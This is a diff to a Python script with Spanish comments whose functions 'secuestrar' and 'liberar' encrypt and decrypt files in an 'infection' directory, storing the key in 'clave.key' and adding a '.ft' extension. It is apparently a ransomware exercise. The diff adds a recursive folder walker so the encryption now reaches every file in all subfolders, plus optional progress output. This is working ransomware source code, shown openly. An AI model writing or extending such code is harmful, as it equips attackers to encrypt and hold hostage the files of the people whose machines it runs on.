@@ -103,6 +103,42 @@ def validar_fichero(elemento, modo):
     return False
 
 
+# Genera una lista con todos los ficheros de una carpeta, incluidos los de subcarpetas.
+def contenido(carpeta):
+    # Comprobar que la ruta es una carpeta.
+    if os.path.isdir(carpeta):
+        # Obtener la lista de ficheros.
+        ficheros = os.listdir(carpeta)
+
+        # Comprobar que la carpeta no esté vacía.
+        if len(ficheros) > 0:
+            # Inicializar la lista.
+            lista = []
+
+            # Recorrer la lista de ficheros.
+            for fichero in ficheros:
+                # Comprobar que el fichero sea una carpeta.
+                if os.path.isdir(carpeta + "/" + fichero):
+                    # Añadir los ficheros de la subcarpeta.
+                    lista += contenido(carpeta + "/" + fichero)
+                else:
+                    # Añadir el fichero.
+                    lista.append(carpeta + "/" + fichero)
+
+            # Devolver la lista.
+            return lista
+
+        else:
+            # Devolver una lista vacía.
+            return []
+
+    else:
+        if not silencio:
+            print("Error: la ruta indicada no es una carpeta.")
+
+        exit(1)
+
+
 # Cifra los archivos del directorio de este script que tenga alguna de las extensiones indicadas.
 # Una vez cifrados les añade la extensión '.ft' y los guarda en un directorio llamado 'infection'.
 def secuestrar():
@@ -110,10 +146,7 @@ def secuestrar():
     exito = 0       # Ficheros cifrados
 
     # Obtener todos los elementos en el directorio de este script.
-    for fichero in os.listdir(infectorio):
-        # Completar la ruta del elemento.
-        fichero = os.path.join(infectorio, fichero)
-
+    for fichero in contenido(infectorio):
         # Comprobar la validez del fichero para su cifrado.
         if validar_fichero(fichero, "c"):
             ficheros.append(fichero)
@@ -125,8 +158,15 @@ def secuestrar():
     with open("clave.key", "wb") as f:
         f.write(clave)
 
+    # Mostrar mensaje si hay ficheros para cifrar.
+    if not silencio and ficheros:
+        print("Cifrando archivos:")
+
     # Cifrar los ficheros obtenidos anteriormente.
     for fichero in ficheros:
+        if not silencio:
+            print("\t{}".format(fichero))
+
         try:
             # Extraer y cifrar el contenido del fichero.
             with open(fichero, "rb") as f:
@@ -166,10 +206,7 @@ def liberar(carpeta):
     exito = 0       # Ficheros descifrados
 
     # Obtener todos los elementos en el directorio de este script.
-    for elemento in os.listdir(infectorio):
-        # Completar la ruta del elemento.
-        elemento = infectorio + "/" + elemento
-
+    for elemento in contenido(infectorio):
         # Comprobar la validez del elemento para su descifrado.
         if validar_fichero(elemento, "d"):
             ficheros.append(elemento)
